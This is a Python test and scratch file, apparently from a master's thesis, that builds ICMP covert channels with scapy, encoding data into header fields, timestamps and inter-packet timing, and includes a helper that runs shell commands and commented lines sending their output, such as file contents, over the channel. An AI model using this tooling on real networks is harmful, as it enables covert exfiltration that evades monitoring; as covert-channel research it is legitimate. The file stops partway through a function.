from mymethods import *  
from scapy.all import *
from attacksingleton  import *
import datetime, ipaddress 
import re 
import time  
import math
from pypdf import PdfReader 

destinazione=ipaddress.ip_address("192.168.1.151") 
tempo_inizio=datetime.datetime.now() 
sleep_time=10*60 #15 min
ripetizioni=1 
un_KB=("BORGOGNA"*128)#.encode()
print("Dato length:", len(un_KB)) 
for index in range(ripetizioni):
    SendSingleton.send_data(
        True, 
        False, 
        AttackType.ipv4_destination_unreachable,  
        un_KB.encode(),
        destinazione
    ) 
    tempo_fine=datetime.datetime.now()
    print("Tempo di invio:", tempo_fine-tempo_inizio)
    if index!=ripetizioni-1: 
        print(f"{index}o tempo di invio:", datetime.datetime.now()) 
        non_blocking_sleep(sleep_time) 
exit(0)

qazwsx=ReceiveSingleton("ipv4_information", True)
data=qazwsx.wait_data()  
print("DATA: ",data) 
print("DATA: ",data.replace("BORGOGNA","")) 
print("LENGTH: ",len(data)) 
exit(0)


data="echo 'Ciao'".encode() 

def test_printTimestamp():
    for index in range(0, len(data), 5): 
        try:
            icmp_id=(data[index]<<8)+data[index+1]  
            print(f"ICMP id: {icmp_id}")
        except IndexError as e: 
            #print(f"Index error: {e}")
            icmp_id=(data[index]<<8)
            print(f"ICMP id: {icmp_id}")
            exit()
        except Exception as e:
            exit()
        current_time=datetime.datetime.now(datetime.timezone.utc) 
        midnight = current_time.replace(hour=0, minute=0, second=0, microsecond=0) 

        data_pkt=int.from_bytes(data[index+2:index+3]) *10**3
        current_time=current_time.replace(microsecond=data_pkt)
        icmp_ts_ori=int((current_time - midnight).total_seconds() * 1000) 
        print(f"Byte data: {data[index+2:index+3]}")
        print(f"Data pkt: {data_pkt}")
        print(f"Timestamp: {icmp_ts_ori}") 
    
        data_pkt=int.from_bytes(data[index+3:index+4]) *10**3 
        if current_time.second+1<60:
            current_time=current_time.replace(
                second=current_time.second+1, microsecond=data_pkt
            ) 
        else:
            current_time=current_time.replace(
                minute=current_time.minute+1,second=(current_time.second+1)%60, microsecond=data_pkt
            ) 
        icmp_ts_rx=int((current_time - midnight).total_seconds() * 1000) 
        print(f"Byte data: {data[index+3:index+4]}")
        print(f"Data pkt: {data_pkt}")
        print(f"Timestamp: {icmp_ts_rx}")

        data_pkt=int.from_bytes(data[index+4:index+5]) *10**3 
        if current_time.second+1<60: 
            current_time=current_time.replace(
                second=current_time.second+1, microsecond=data_pkt
            )
        else: 
            current_time=current_time.replace(
                minute=current_time.minute+1,second=(current_time.second+1)%60, microsecond=data_pkt
            )
        icmp_ts_tx=int((current_time - midnight).total_seconds() * 1000) 
        print(f"Byte data: {data[index+4:index+5]}")
        print(f"Data pkt: {data_pkt}")
        print(f"Timestamp: {icmp_ts_tx}")

def test_decodeData_fromPackets():
    packet_list=[]
    data="echo 'Ciao'".encode()
    ip_dst=ipaddress.ip_address("192.168.1.17")
    def ipv4_destination_unreachable(data:bytes=None, ip_dst:ipaddress.IPv4Address=None): 
            if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(ip_dst):
                raise Exception(f"test_decodeData_fromPackets: Argoemnti non corretti")
            if ip_dst.version!=4:
                print(f"IP version is not 4: {ip_dst.version}")
                return False
            interface=IP_INTERFACE.iface_from_IP(ip_dst) 
            TYPE_DESTINATION_UNREACHABLE=3 
            ip_dst=ipaddress.ip_address("192.168.1.17")
            for index in range(0, len(data), 8):
                dummy_ip=IP(src=ip_dst.compressed, dst="8.8.8.8", len=int.from_bytes(data[index+4:index+6])) / \
                    ICMP(id=int.from_bytes(data[index+6:index+8]))
                pkt= IP(dst=ip_dst.compressed)/\
                    ICMP(type=TYPE_DESTINATION_UNREACHABLE, unused=int.from_bytes(data[index:index+4]) )/\
                    Raw(load=bytes(dummy_ip)[:28])
                #print(f"Sending {pkt.summary()}") 
                print(f"Data: {data[index:index+4]}\t{int.from_bytes(data[index:index+4])}")
                print(f"Data: {data[index+4:index+6]}\t{int.from_bytes(data[index+4:index+6])}") 
                print(f"Data: {data[index+6:index+8]}\t{int.from_bytes(data[index+6:index+8])}")
                print(pkt.summary())
                packet_list.append(pkt)
                #if pkt:
                #    ans = send(pkt, verbose=1, iface=interface) 
            dummy_ip=IP(src=ip_dst.compressed, dst="8.8.8.8") / ICMP(id=0,seq=1)
            pkt= IP(dst=ip_dst.compressed)/ICMP(type=TYPE_DESTINATION_UNREACHABLE)/Raw(load=bytes(dummy_ip)[:28])
            #print(f"Sending {pkt.summary()}")  
            print(f"interface: {interface}")
            packet_list.append(pkt)
            #ans = send(pkt, verbose=1, iface=interface) 
            #if ans: 
            #    return True  
            #return False 

    ipv4_destination_unreachable(data, ip_dst)
    print(packet_list)
    print(len(packet_list)) 

    decoded_data=[]
    TYPE_DESTINATION_UNREACHABLE=3 
    for pkt in packet_list:
        if pkt.haslayer(IP) and pkt.haslayer(ICMP) and pkt.haslayer(Raw): 
            inner_ip = IP(pkt[Raw].load)
            if inner_ip[ICMP].id==0 and inner_ip[ICMP].seq==1: 
                break 
            elif not inner_ip: 
                print("Pacchetto non ha livello IP error\t",pkt)
                break
            unused_int = pkt[ICMP].unused
            if isinstance(unused_int, bytes): 
                decoded_data.append(unused_int.decode().lstrip('\x00').rstrip('\x00')) 
            elif isinstance(unused_int, int): 
                decoded_data.append(unused_int.to_bytes(4, "big").decode().lstrip('\x00').rstrip('\x00')) 
            decoded_data.append(inner_ip.len.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
            decoded_data.append(inner_ip[ICMP].id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
            
            #if pkt[ICMP][ICMPerror].id==0 and pkt[ICMP][ICMPerror].seq==1: 
                #print("AAAA")
                #print(decoded_data)
            #elif pkt[ICMP].type==TYPE_DESTINATION_UNREACHABLE and not inner_ip.haslayer(IP): #packet.haslayer(Padding):
                #THREADING_EVENT.set(event_pktconn)
                #exit(0)
                #print("Pacchetto non ha livello IP error\t",pkt)
    print(decoded_data)

def write_1000_ciao():
    with open("1000_ciao.txt", "w",encoding="utf-8") as file:
        print( [hex(ord(caracter)) for caracter in "Ciao"])
        print(''.join(hex(ord(char)) for char in "Ciao"))
        for i in range(1,1000):
            file.write("Ciao"*i)
            #file.write("\n")

def write_100_banana():
    with open("100_banana.txt", "w",encoding="utf-8") as file:
        print( [hex(ord(caracter)) for caracter in "Banana"])
        print(''.join(hex(ord(char)) for char in "Banana"))
        for i in range(1,100):
            file.write("Banana"*i)
            #file.write("\n")

def read_100_ciao_hex():
    with open("100_ciao.txt", "r",encoding="utf-8") as file: 
        for chunk in iter(lambda: file.read(16), ''):
            print( chunk.encode('utf-8').hex() ) 

def read_files():
    with open("_get_over_you.txt","r",encoding="utf-8") as read_file: 
        contenuto=[]
        for line in read_file.readlines():
            print(len(line), len(line.encode()),end=" ")
            contenuto.append(len(line.encode())) 
        x=0
        for length in contenuto:
            x+=length
        print(x)

    print("#----------------------")
    with open("100_ciao.txt","r",encoding="utf-8") as read_file: 
        contenuto=[]
        for line in read_file.readlines():
            print(len(line), len(line.encode()),end=" ")
            contenuto.append(len(line.encode()))
        x=0
        for length in contenuto:
            x+=length
        print(x)

def send_receive_Singleton():
    def test_ReceiveSingleton():
        final_data=[]
        ip_dst=ipaddress.ip_address("192.168.1.3")
        ip_src=ipaddress.ip_address("192.168.1.17")
        ReceiveSingleton.ipv4_timestamp_request(ip_dst, final_data, ip_src)
        print("Dati ricevuti: ", final_data) 

    def test_SendSingleton(data:bytes=None):
        if not data or not IS_TYPE.bytes(data):
            data="Dato mandato da computer di Marco".encode()
        ip_dst=ipaddress.ip_address("192.168.1.17")
        SendSingleton.ipv4_information_reply(data=data, ip_dst=ip_dst) 
        #ipv4_timestamp_reply warnings MAC address 

#-----------------------------------------------
def esegui_comando(comando): 
    print(comando)
    cwd = r"D:\Tesi Magistrale\implementazione\unione\scelta_type"
    try:
        # Esegui il comando e cattura output e errori
        risultato = subprocess.run(
            comando
            ,shell=True, check=True 
            ,stdout=subprocess.PIPE, stderr=subprocess.PIPE
            #,cwd=cwd
        )
        codifiche=["utf-8", "cp1252", "cp850", "cp437"] #Windows chcp da la codifca sistema ->cp{val_preso}
        index_codifiche=0
        while True:
            try: 
                stderr=risultato.stderr.decode(codifiche[index_codifiche], errors="replace") 
                stdout=risultato.stdout.decode(codifiche[index_codifiche], errors="replace")
                print("Err", stderr)
                print("Out", stdout)
                if stderr:
                    stdout += "\n[Errore]\n" + stderr
                return stdout 
            except UnicodeDecodeError as e: 
                if index_codifiche>=len(codifiche): 
                    raise Exception("esegui_comando: Codifica testo sconosciuta")
                index_codifiche+=1
    except subprocess.CalledProcessError as e: 
        stderr = e.stderr.decode("utf-8", errors="replace") if e.stderr else str(e)
        return f"Errore durante l'esecuzione del comando:\n{stderr}" 

# Esempio di utilizzo
#comando = "echo Ciao Mondo" 
#comando=r"cd 'D:\Tesi Magistrale\implementazione\unione\scelta_type' & dir" #"cd 'D:\\Tesi Magistrale\\implementazione\\unione\\scelta_type'; ls"
#comando=r"type _get_over_you.txt" 
#comando=r"type 100_ciao.txt" 
#comando=r"type 100_banana.txt" 
#comando=r"type 1000_ciao.txt"
#output = esegui_comando(comando)
#print(output) 
#test_SendSingleton(output.encode()) 

def test_1st_last_4bit(): 
    #return primi_4, ultimi_4
    data="echo 'Ciao'".encode()
    for index in data:
        print("Index:", index, bin(index))
        print("Primi 4 bit:", (index& 0b11110000)>>4)
        print("Ultimi 4 bit:", index& 0b00001111)
        print("")  

#----------------------------------------------- 
def get_tipologia_byte(): 
    #Ritorna un dizionario in cui si associa ad una tipologia di messaggio ICMP i byte trasportabili
    return {
        15:2, 16:2 #information
        ,13:5,14:5 #timestamp
        ,8:2, 0:2 #echo
        ,5:4 #redirect
        ,4:8 #quench
        ,12:7 #problem
        ,11:6 #time_exceeded
        ,3:8 #destination_unreachable
    } 
#-----------------------------------------------  
def get_1st_last_4bit(numero:int):
    #Da un byte ricava i primi 4 bit e gli ultimi 4 bit 
    if not IS_TYPE.integer(numero):
        raise Exception("get_1st_last_4bit:Argomento non valido")
    primi_4=(numero& 0b11110000)>>4
    ultimi_4=numero& 0b00001111 
    return primi_4, ultimi_4 


def get_lista_codici(): 
    #Lista degli interi tipologia+codice
    return [
        30,31,32,33,34,35 #destination unreachable
        ,110,111 #time exceeded
        ,120 #parameter problem
        ,40 #source quench
        ,50,51,52,53 #redirect
        ,80#, 0 #echo request/reply
        ,130#, 140 #timestamp request/reply
        ,150#, 160 #info request/reply
    ] 

def get_tipologia_codice(elemento=None): 
    lista_codici=get_lista_codici()

    def get_tipologia_codice_str(stringa:str=None): 
        #Data una stringa ritorna la tipologia di messaggio ICMP e il codice relativo
        if not IS_TYPE.string(stringa):
            #print("Argomento non corretto") 
            return None,None
        if not re.match(r"^[0-9]{2,3}$",stringa): 
            #print(f"Stringa non valida {stringa}")  
            return None,None
        nonlocal lista_codici
        if int(stringa) not in lista_codici: 
            #print(f"Codice stringa non valido: {stringa}")
            return None,None
        #print("Stringa passata:", stringa) 
        codice= stringa.lower().strip()[-1]
        tipologia= stringa.lower().strip()[:-1] 
        #print("Codice:", codice, "Tipologia:", tipologia)
        return int(tipologia), int(codice) 

    def get_tipologia_codice_int(numero:int=None): 
        #Dato un intero ritorna la tipologia di messaggio ICMP e il codice relativo
        if not IS_TYPE.integer(numero):
            #print("Argomento non corretto") 
            return None,None 
        nonlocal lista_codici
        if numero not in lista_codici: 
            #print(f"Intero non valido: {numero}")
            return None,None
        #print("Intero passato:", numero) 
        codice= numero%10
        tipologia= numero//10
        #print("Codice:", codice, "Tipologia:", tipologia)
        return tipologia, codice 
    
    if IS_TYPE.string(elemento): 
        return get_tipologia_codice_str(elemento) 
    elif IS_TYPE.integer(elemento): 
        return get_tipologia_codice_int(elemento) 
    else: 
        #print(f"Elemento passatto non è ne una stringa ne un intero: {elemento}")
        return None, None

def get_dict_bit_codice():
    def get_codice_bit():
        #Ritorna il dizionario in cui si associa ad un codice  (con codice=tipologia+coddice ICMP) l'intero associato 
        codice_bit={}
        lista_codici=get_lista_codici()
        #Associo ad ogni intero da 0 sino a 16 il proprio messaggio ICMP
        for index in range(0,len(lista_codici)):
            #print("Coppia:\t",index, lista_codici[index])
            if lista_codici[index]==80: 
                codice_bit.update({80:index}) 
            elif lista_codici[index]==130:
                codice_bit.update({140:index}) 
            elif lista_codici[index]==150:
                codice_bit.update({160:index}) 
            codice_bit.update({lista_codici[index]:index})
        return codice_bit 

    def get_bit_codice():
        #Ritorna il dizionario in cui si associa a un intero il codice associato (con codice=tipologia+coddice ICMP)
        bit_codice={}
        lista_codici=get_lista_codici()
        #Associo ad ogni intero da 0 sino a 16 il proprio messaggio ICMP
        for index in range(0,len(lista_codici)):
            #print("Coppia:\t",index, lista_codici[index])
            if lista_codici[index]==80: 
                bit_codice.update({index:0}) 
            elif lista_codici[index]==130:
                bit_codice.update({index:140})
            elif lista_codici[index]==150:
                bit_codice.update({index:160})
            bit_codice.update({index:lista_codici[index]})
        return bit_codice 
    
    return get_bit_codice(), get_codice_bit()


def receive_test_hybrid_channel(ip_dst:ipaddress=None, ip_src:ipaddress=None): 
    def get_packet_data(pkt): 
        if not pkt or not pkt.haslayer("ICMP"):
            return ""
        tipologia=pkt["ICMP"].type 
        testo=""
        match tipologia: 
            case 15|16: 
                print("ipv4_information_reply") 
                icmp_id=pkt[ICMP].id
                byte1 = (icmp_id >> 8) & 0xFF 
                byte2 = icmp_id & 0xFF 
                testo=chr(byte1)+chr(byte2)
                #print(f"Callback received: {byte1} / {chr(byte1)}") 
                #print(f"Callback received: {byte2} / {chr(byte2)}") 
                #print("Testo pacchetto:",testo)
                #return testo
            case 13|14: 
                print("ipv4_timestamp_reply")  
                icmp_id=pkt[ICMP].id
                byte1 = (icmp_id >> 8) & 0xFF 
                byte2 = icmp_id & 0xFF  
                testo=chr(byte1)+chr(byte2)
                #print(f"Callback received: {byte1} / {chr(byte1)}") 
                #print(f"Callback received: {byte2} / {chr(byte2)}") 
                #print("Testo pacchetto:",testo)
                
                icmp_ts_ori=str(pkt[ICMP].ts_ori)[-3:] 
                icmp_ts_rx=str(pkt[ICMP].ts_rx)[-3:] 
                icmp_ts_tx=str(pkt[ICMP].ts_tx)[-3:] 
                testo=testo+chr(int(icmp_ts_ori))+chr(int(icmp_ts_rx))+chr(int(icmp_ts_tx))
                #print(f"Callback received: {icmp_ts_ori} / {chr(int(icmp_ts_ori))}") 
                #print(f"Callback received: {icmp_ts_rx} / {chr(int(icmp_ts_rx))}") 
                #print(f"Callback received: {icmp_ts_tx} / {chr(int(icmp_ts_tx))}") 
                #print("Testo pacchetto:",testo) 
                #return testo
            case 8|0: 
                print("ipv4_echo_reply") 
                icmp_id=pkt[ICMP].id
                byte1 = (icmp_id >> 8) & 0xFF 
                byte2 = icmp_id & 0xFF 
                testo=chr(byte1)+chr(byte2)
                #print(f"Callback received: {byte1} / {chr(byte1)}") 
                #print(f"Callback received: {byte2} / {chr(byte2)}") 
                #print("Testo pacchetto:",testo) 
                #return testo
            case 5: 
                print("ipv4_redirect") 
                if pkt.haslayer(IPerror) and pkt.haslayer(ICMPerror): 
                    #inner_ip = IP(pkt[Raw].load) 
                    inner_ip=pkt[IPerror] #ICMPerror 
                    icmp_ip_length=inner_ip.len
                    icmp_icmp_id=inner_ip[ICMPerror].id 
                    testo=icmp_ip_length.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')+icmp_icmp_id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00') 
                    #print("Testo pacchetto:",testo) 
                else:print(pkt.lastlayer())
                #return testo 
            case 4: 
                print("ipv4_source_quench") 
                if pkt.haslayer(IPerror) and pkt.haslayer(ICMPerror): 
                    #inner_ip = IP(pkt[Raw].load) 
                    inner_ip=pkt[IPerror] #ICMPerror 
                    testo= pkt[ICMP].reserved.to_bytes(1,"big").decode().lstrip('\x00').rstrip('\x00') #1 byte ByteField
                    testo= testo+pkt[ICMP].length.to_bytes(1,"big").decode().lstrip('\x00').rstrip('\x00') #1 byte ByteField
                    testo= testo+pkt[ICMP].nexthopmtu.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00') #2byte ShortField 
                    #print("Testo pacchetto:",testo) 
                else:print(pkt.lastlayer())
                #return testo
            case 12: 
                print("ipv4_parameter_problem") 
                if pkt.haslayer(IPerror) and pkt.haslayer(ICMPerror): 
                    #inner_ip = IP(pkt[Raw].load) 
                    inner_ip=pkt[IPerror] #ICMPerror 
                    testo=pkt[ICMP].ptr.to_bytes(1,"big").decode().lstrip('\x00').rstrip('\x00')
                    testo=testo+pkt[ICMP].unused.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00') 
                    testo=testo+inner_ip.len.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')
                    test=testo+inner_ip[ICMPerror].id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')  
                    #print("Testo pacchetto:",testo) 
                else:print(pkt.lastlayer())
                #return testo
            case 11: 
                print("ipv4_time_exceeded") 
                if pkt.haslayer(IPerror) and pkt.haslayer(ICMPerror): 
                    #inner_ip = IP(pkt[Raw].load) 
                    inner_ip=pkt[IPerror] #ICMPerror
                    try: 
                        testo= pkt[ICMP].unused.to_bytes(4,"big").decode().lstrip('\x00').rstrip('\x00') #1 byte ByteField
                    except Exception as e:
                        print("ipv4_time_exceeded Eccezione: ",e)
                        testo= pkt[ICMP].reserved.to_bytes(1,"big").decode().lstrip('\x00').rstrip('\x00') #1 byte ByteField
                        testo= testo+pkt[ICMP].length.to_bytes(1,"big").decode().lstrip('\x00').rstrip('\x00') #1 byte ByteField
                        testo= testo+pkt[ICMP].nexthopmtu.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00') #2byte ShortField 

                    testo=testo+inner_ip.len.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00') 
                    testo=testo+inner_ip[ICMPerror].id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00') 
                    #print("Testo pacchetto:",testo) 
                else:print(pkt.lastlayer())
                #return data
            case 3: 
                print("ipv4_destination_unreachable") 
                if pkt.haslayer(IPerror) and pkt.haslayer(ICMPerror): 
                    inner_ip=pkt[IPerror] #ICMPerror
                    testo= pkt[ICMP].reserved.to_bytes(1,"big").decode().lstrip('\x00').rstrip('\x00') #1 byte ByteField
                    testo= testo+pkt[ICMP].length.to_bytes(1,"big").decode().lstrip('\x00').rstrip('\x00') #1 byte ByteField
                    testo= testo+pkt[ICMP].nexthopmtu.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00') #2byte ShortField 

                    testo=testo+inner_ip.len.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')
                    testo=testo+inner_ip[ICMPerror].id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')  
                else:print(pkt.lastlayer()) 
        print("Testo pacchetto:",testo) 
        return testo 

    if not (IS_TYPE.ipaddress(ip_dst) and IS_TYPE.ipaddress(ip_src)):
        raise Exception("test_timing_channel8bit: Argomenti non validi") 
    rumore:int=2 
    min_delay=1+rumore 
    max_delay=30+rumore
    stop_value= 255
    seed=4582 
    _, codice_bit=get_dict_bit_codice()
    if min_delay<=0: 
        raise Exception(f"test_timing_channel8bit: Valore minimo non accettato: {min_delay}")
    if max_delay<=min_delay: 
        raise Exception(f"test_timing_channel8bit: Il valore masismo non può essere minore di quello minimo") 
    if not (0<=stop_value <=255): 
        raise Exception(f"test_timing_channel8bit: Valore stop value non corretto: {stop_value}") 
     
    start_time=end_time=current_time=previous_time=None 
    stop_flag={"value":False} 
    received_data=[] 
    received_packet=0
    previous_type=None 
    
    target_mac = IP_INTERFACE.get_macAddress(ip_dst).strip().replace("-",":").lower() 
    interface=IP_INTERFACE.iface_from_IP(ip_dst) 
    #print(f"MAC di destinazione: {target_mac}")
    #print(f"Interfaccia per destinazione: {interface}") 

    def decode_byte(delay): 
        #(byte/255)=(delay-min_delay)/(max_delay-min_delay) 
        frazione = (delay - min_delay) / (max_delay - min_delay) 
        byte=int(round(frazione*255)) 
        byte = max(0, min(255, byte))
        return byte 
    
    def callback_timing_channel8bit(pkt): 
        nonlocal current_time, previous_time, start_time, end_time, received_packet, previous_type
        if pkt.haslayer("ICMP"): 
            if pkt["ICMP"].type==15 and not start_time: 
                print("Init\t", "Type:",pkt["ICMP"].type," Start:",start_time) 
                current_time=previous_time=start_time=pkt.time  
                return
            elif pkt["ICMP"].type==15 and start_time: 
                print("End\t", "Type:",pkt["ICMP"].type," Start:",start_time) 
                end_time=pkt.time 
                stop_flag["value"]=True 
                return
            #else: print("Ricevendo i dati") 
            received_packet=(received_packet+1)%2 
            if received_packet==1: 
                try: 
                    #print("Primo pacchetto:",received_packet)
                    previous_type=pkt[ICMP].type*10+pkt[ICMP].code 
                    #print("Previous type:",previous_type)
                    random_delay=0 
                    current_time=pkt.time 
                    delay=(current_time-previous_time)-random_delay 
                    byte=decode_byte(delay) 
                    received_data.append(chr(byte)) 
                    previous_time=current_time 
                    #print("This Delay:", delay,"Random delay:", random_delay, "Send Delay" ,delay-random_delay) 
                    #print(f"Delta:{delay}\tByte:{byte} Char:{chr(byte)}") 
                    #print("Current time:", current_time, "Previous Type:",previous_time) 
                except Exception as e: 
                    print("1 Eccezione:",e)
            elif received_packet==0: 
                try: 
                    #print("Secondo pacchetto:",received_packet) 
                    current_type=pkt[ICMP].type*10+pkt[ICMP].code 
                    previous_bit=codice_bit[previous_type] 
                    current_bit=codice_bit[current_type] 
                    #primi_4=(numero& 0b11110000)>>4
                    #ultimi_4=numero& 0b00001111 
                    type_byte=(previous_bit<<4)+current_bit
                    list_len=len(received_data)-1
                    prev_value=received_data[list_len] 
                    #print("previous Value:",prev_value)
                    #print("Prev list:", received_data) 
                    received_data[list_len]=chr(type_byte)
                    received_data.append(prev_value) 
                    #print("Prev list:", received_data) 
                    
                    #print("Previous Type: ", previous_type," Byte: ",previous_bit) 
                    #print("Current Type: ",current_type, " Byte: ", current_bit) 
                    #print("Intero:",type_byte, "Char:",chr(type_byte))
                except Exception as e: 
                    print("2 Eccezione:",e) 
            try:
                received_data.append(get_packet_data(pkt)) 
            except Exception as e: 
                print("3 Eccezione:",e)
                
    def stop_filter(pkt): 
        return stop_flag["value"] 

    print("In ascolto dei pacchetti ICMP...")
    sniff(
        filter=f"icmp and src host {ip_src.compressed} and dst host {ip_dst.compressed}" 
        ,prn=callback_timing_channel8bit 
        ,store=False 
        ,stop_filter=stop_filter 
    )  
    print("Dati ricevuti:",received_data)
    received_data="".join(x for x in received_data) 
    print(f"Dati ricevuti: {received_data}") 
    print("Tempo init:",start_time, "Tempo end:",end_time, "Delta:")
    print(f"Tempo di esecuzione: {end_time-start_time}") 
    pass 


def send_test_hybrid_channel(message:bytes=None, ip_dst:ipaddress=None):
    def get_packet(tipologia:int=None, codice:int=None, data:bytes=None, ip_dst:ipaddress=None): 
        if not (IS_TYPE.integer(tipologia) and IS_TYPE.integer(tipologia) and IS_TYPE.bytes(data) and IS_TYPE.ipaddress(ip_dst)):
                raise Exception("test_timing_channel8bit: Argomenti non validi") 
        nonlocal target_mac
        pkt=None
        match tipologia: 
            case 15|16: 
                print("ipv4_information_reply") 
                TYPE_INFORMATION_REQUEST=15
                TYPE_INFORMATION_REPLY=16
                if len(data)==2:  
                    icmp_id=(data[0]<<8)+data[1] 
                elif len(data)==1: 
                    icmp_id=(data[0]<<8) 
                else: return None
                pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/ICMP(type=TYPE_INFORMATION_REPLY, code=codice, id=icmp_id) 
                return pkt
            case 13|14: 
                print("ipv4_timestamp_reply") 
                TYPE_TIMESTAMP_REQUEST=13 
                TYPE_TIMESTAMP_REPLY=14 
                if len(data)>5: 
                    return None
                try:
                    icmp_id=icmp_id=(data[0]<<8)+data[1]  
                except IndexError as e: 
                    icmp_id=(data[0]<<8)
                current_time=datetime.datetime.now(datetime.timezone.utc) 
                midnight = current_time.replace(hour=0, minute=0, second=0, microsecond=0) 

                data_pkt=int.from_bytes(data[2:3]) *10**3
                current_time=current_time.replace(microsecond=data_pkt)
                icmp_ts_ori=int((current_time - midnight).total_seconds() * 1000) 

                data_pkt=int.from_bytes(data[3:4]) *10**3
                if current_time.second+1<60:
                    current_time=current_time.replace(second=current_time.second+1, microsecond=data_pkt)
                else:
                    current_time=current_time.replace(minute=current_time.minute+1,second=(current_time.second+1)%60, microsecond=data_pkt)
                icmp_ts_rx=int((current_time - midnight).total_seconds() * 1000) 

                data_pkt=int.from_bytes(data[4:5]) *10**3
                if current_time.second+1<60:
                    current_time=current_time.replace(second=current_time.second+1, microsecond=data_pkt)
                else:
                    current_time=current_time.replace(minute=current_time.minute+1,second=(current_time.second+1)%60, microsecond=data_pkt)
                icmp_ts_tx=int((current_time - midnight).total_seconds() * 1000) 

                pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/ICMP(
                    type=TYPE_TIMESTAMP_REPLY, code=codice 
                    ,id=icmp_id
                    ,ts_ori=icmp_ts_ori
                    ,ts_rx=icmp_ts_rx
                    ,ts_tx=icmp_ts_tx
                ) 
                return pkt
            case 8|0: 
                print("ipv4_echo_reply") 
                TYPE_ECHO_REQUEST=8
                TYPE_ECHO_REPLY=0 
                if len(data)==2:  
                    icmp_id=(data[0]<<8)+data[1] 
                elif len(data)==1: 
                    icmp_id=(data[0]<<8) 
                else: return None 
                pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/ICMP(type=TYPE_ECHO_REPLY,id=icmp_id) 
                return pkt
            case 5: 
                print("ipv4_redirect") 
                TYPE_REDIRECT=5
                if len(data)>4: 
                    return None 
                dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", len=int.from_bytes(data[0:+2])) / ICMP(id=int.from_bytes(data[2:4]))
                pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/ICMP(type=TYPE_REDIRECT, code=codice)/Raw(load=bytes(dummy_ip)[:28]) 
                return pkt
            case 4: 
                print("ipv4_source_quench") 
                TYPE_SOURCE_QUENCH=4 
                if len(data)>8: 
                    return None 
                dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", len=int.from_bytes(data[4:6])) / ICMP(id=int.from_bytes(data[6:8]))
                pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/\
                    ICMP(type=TYPE_SOURCE_QUENCH, code=codice)/\
                    Raw(load=bytes(dummy_ip)[:28]) 
                pkt[ICMP].reserved = int.from_bytes(data[0:1]) #1 byte ByteField
                pkt[ICMP].length = int.from_bytes(data[1:2]) #1 byte ByteField
                pkt[ICMP].nexthopmtu = int.from_bytes(data[2:4]) #2byte ShortField 
                return pkt
            case 12: 
                print("ipv4_parameter_problem") 
                TYPE_PARAMETER_PROBLEM=12 
                if len(data)>7: 
                    return None 
                dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", len=int.from_bytes(data[3:5])) / \
                    ICMP(id=int.from_bytes(data[5:7]))
                pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/\
                    ICMP(type=TYPE_PARAMETER_PROBLEM, code=codice, ptr=int(data[0]) ,unused=int.from_bytes(data[1:3]) )/\
                    Raw(load=bytes(dummy_ip)[:28]) 
                pkt.show2()
                hexdump(pkt)
                return pkt
            case 11: 
                print("ipv4_time_exceeded") 
                TYPE_TIME_EXCEEDED=11 
                if len(data)>8: 
                    return None 
                dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", len=int.from_bytes(data[2:4])) / \
                    ICMP(id=int.from_bytes(data[4:6]))
                pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/\
                    ICMP(type=TYPE_TIME_EXCEEDED, code=codice, unused=int.from_bytes(data[0:2]) )/\
                    Raw(load=bytes(dummy_ip)[:28]) 
                pkt[ICMP].reserved = int.from_bytes(data[0:1]) #1 byte ByteField
                pkt[ICMP].length = int.from_bytes(data[1:2]) #1 byte ByteField
                pkt[ICMP].nexthopmtu = int.from_bytes(data[2:4]) #2byte ShortField 
                return pkt
            case 3: 
                print("ipv4_destination_unreachable") 
                TYPE_DESTINATION_UNREACHABLE=3  
                if len(data)>8: 
                    return None  
                dummy_ip=IP(src=ip_dst.compressed, dst="8.8.8.8", len=int.from_bytes(data[4:6])) / \
                    ICMP(id=int.from_bytes(data[6:8]))
                pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/\
                    ICMP(type=TYPE_DESTINATION_UNREACHABLE, code=codice)/\
                    Raw(load=bytes(dummy_ip)[:28]) 
                pkt[ICMP].reserved = int.from_bytes(data[0:1]) #1 byte ByteField
                pkt[ICMP].length = int.from_bytes(data[1:2]) #1 byte ByteField
                pkt[ICMP].nexthopmtu = int.from_bytes(data[2:4]) #2byte ShortField 
                #pkt.show() 
                #pkt.show2()
                #hexdump(pkt)
                return pkt 
        return pkt

    if not (IS_TYPE.bytes(message) and IS_TYPE.ipaddress(ip_dst)):
            raise Exception("test_timing_channel8bit: Argomenti non validi") 
    rumore:int=2 
    min_delay=1+rumore 
    max_delay=30+rumore 
    stop_value=255 
    seed=4582 
    if min_delay<=0: 
        raise Exception(f"test_timing_channel8bit: Valore minimo non accettato: {min_delay}")
    if max_delay<=min_delay: 
        raise Exception(f"test_timing_channel8bit: Il valore masismo non può essere minore di quello minimo") 
    if not (0<=stop_value <=255): 
        raise Exception(f"test_timing_channel8bit: Valore stop value non corretto: {stop_value}") 
    
    target_mac = IP_INTERFACE.get_macAddress(ip_dst).strip().replace("-",":").lower() 
    interface=IP_INTERFACE.iface_from_IP(ip_dst) 
    #print(f"MAC di destinazione: {target_mac}")
    #print(f"Interfaccia per destinazione: {interface}") 

    bit_codice ,_=get_dict_bit_codice() 
